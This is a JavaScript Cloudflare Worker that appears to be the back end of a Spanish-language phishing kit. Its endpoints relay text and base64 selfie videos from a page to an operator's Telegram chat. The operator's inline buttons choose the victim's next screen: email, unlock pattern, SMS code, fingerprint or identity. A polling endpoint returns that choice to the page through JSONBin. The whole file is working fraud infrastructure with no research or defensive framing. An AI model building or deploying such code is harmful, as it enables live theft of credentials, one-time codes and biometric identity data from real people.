export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    
    if (url.pathname === '/api/check-action' && request.method === 'GET') {
      const sessionId = url.searchParams.get('id');
      if (!sessionId) return new Response(JSON.stringify({ action: 'pending' }), { headers: { 'Content-Type': 'application/json' } });

      const BIN_ID = env.JSONBIN_BIN_ID;
      const API_KEY = env.JSONBIN_API_KEY;
      if (!BIN_ID || !API_KEY) return new Response(JSON.stringify({ action: 'pending' }), { headers: { 'Content-Type': 'application/json' } });

      try {
        const resp = await fetch('https://api.jsonbin.io/v3/b/' + BIN_ID + '/latest', { headers: { 'X-Master-Key': API_KEY } });
        const jsonResp = await resp.json();
        const data = jsonResp.record || {};
        const action = data[sessionId];
        if (!action) return new Response(JSON.stringify({ action: 'pending' }), { headers: { 'Content-Type': 'application/json' } });
        
        const validActions = ['correct', 'incorrect', 'correo', 'patron', 'sms', 'nuevo', 'dactilar', 'identidad'];
        if (validActions.includes(action)) return new Response(JSON.stringify({ action: action }), { headers: { 'Content-Type': 'application/json' } });
        
        return new Response(JSON.stringify({ action: 'pending' }), { headers: { 'Content-Type': 'application/json' } });
      } catch (err) {
        return new Response(JSON.stringify({ action: 'pending' }), { headers: { 'Content-Type': 'application/json' } });
      }
    }
    
    if (url.pathname === '/api/send-telegram' && request.method === 'POST') {
      try {
        const body = await request.json();
        const { message, sessionId, buttons, btn1Label, btn2Label, btn3Label, btn3Action, btn4Label, btn4Action } = body;
        if (!message) return new Response(JSON.stringify({ error: 'Message is required' }), { status: 400, headers: { 'Content-Type': 'application/json' } });

        const BOT_TOKEN = env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = env.TELEGRAM_CHAT_ID;
        if (!BOT_TOKEN || !CHAT_ID) return new Response(JSON.stringify({ error: 'Missing Telegram config' }), { status: 500, headers: { 'Content-Type': 'application/json' } });

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const payload = { chat_id: CHAT_ID, text: message };

        if (buttons) {
          let keyboard = [
            [
              { text: btn1Label || 'Correcto', callback_data: JSON.stringify({ id: sessionId, action: 'correct' }) },
              { text: btn2Label || 'Incorrecto', callback_data: JSON.stringify({ id: sessionId, action: 'incorrect' }) }
            ]
          ];
          if (btn3Label && btn3Action) keyboard.push([{ text: btn3Label, callback_data: JSON.stringify({ id: sessionId, action: btn3Action }) }]);
          if (btn4Label && btn4Action) keyboard.push([{ text: btn4Label, callback_data: JSON.stringify({ id: sessionId, action: btn4Action }) }]);
          payload.reply_markup = { inline_keyboard: keyboard };
        }

        const response = await fetch(telegramUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        const data = await response.json();
        return new Response(JSON.stringify(data), { status: 200, headers: { 'Content-Type': 'application/json' } });
      } catch (error) {
        return new Response(JSON.stringify({ error: error.toString() }), { status: 500, headers: { 'Content-Type': 'application/json' } });
      }
    }
    
    if (url.pathname === '/api/send-video' && request.method === 'POST') {
      try {
        const body = await request.json();
        const { videoBase64, caption } = body;
        if (!videoBase64) return new Response(JSON.stringify({ error: 'No video provided' }), { status: 400, headers: { 'Content-Type': 'application/json' } });

        const BOT_TOKEN = env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = env.TELEGRAM_CHAT_ID;
        if (!BOT_TOKEN || !CHAT_ID) return new Response(JSON.stringify({ error: 'Missing Telegram config' }), { status: 500, headers: { 'Content-Type': 'application/json' } });

        const binaryString = atob(videoBase64);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }
        const blob = new Blob([bytes], { type: 'video/webm' });
        
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', caption);
        formData.append('video', blob, 'selfie.webm');

        const resp = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendVideo', { method: 'POST', body: formData });
        const data = await resp.json();
        return new Response(JSON.stringify({ ok: data.ok, data: data }), { status: 200, headers: { 'Content-Type': 'application/json' } });
      } catch (err) {
        return new Response(JSON.stringify({ ok: false, error: err.message }), { status: 500, headers: { 'Content-Type': 'application/json' } });
      }
    }
    
    if (url.pathname === '/api/telegram-webhook' && request.method === 'POST') {
      const clonedRequest = request.clone();
      const response = new Response('OK', { status: 200 });
      ctx.waitUntil(
        (async () => {
          try {
            const update = await clonedRequest.json();
            if (!update.callback_query) return;

            const callbackQuery = update.callback_query;
            const BOT_TOKEN = env.TELEGRAM_BOT_TOKEN;
            const BIN_ID = env.JSONBIN_BIN_ID;
            const API_KEY = env.JSONBIN_API_KEY;
            if (!BOT_TOKEN || !BIN_ID || !API_KEY) return;

            const data = JSON.parse(callbackQuery.data);
            const sessionId = data.id;
            const action = data.action;
            let buttonLabel = action;

            try {
              if (callbackQuery.message && callbackQuery.message.reply_markup && callbackQuery.message.reply_markup.inline_keyboard) {
                const keyboard = callbackQuery.message.reply_markup.inline_keyboard;
                for (const row of keyboard) {
                  for (const btn of row) {
                    if (btn.callback_data) {
                      const btnData = JSON.parse(btn.callback_data);
                      if (btnData.action === action) buttonLabel = btn.text;
                    }
                  }
                }
              }
            } catch (e) { }

            let binResp = await fetch('https://api.jsonbin.io/v3/b/' + BIN_ID + '/latest', { headers: { 'X-Master-Key': API_KEY } });
            let binData = await binResp.json();
            let record = binData.record || {};
            record[sessionId] = action;

            await fetch('https://api.jsonbin.io/v3/b/' + BIN_ID, {
              method: 'PUT',
              headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY },
              body: JSON.stringify(record)
            });

            const messageId = callbackQuery.message.message_id;
            const chatId = callbackQuery.message.chat.id;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
            });

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ callback_query_id: callbackQuery.id, text: 'Selección registrada: ' + buttonLabel })
            });
          } catch (e) { }
        })()
      );
      return response;
    }
    
    // Fallback to static assets
    return env.ASSETS.fetch(request);
  }
}
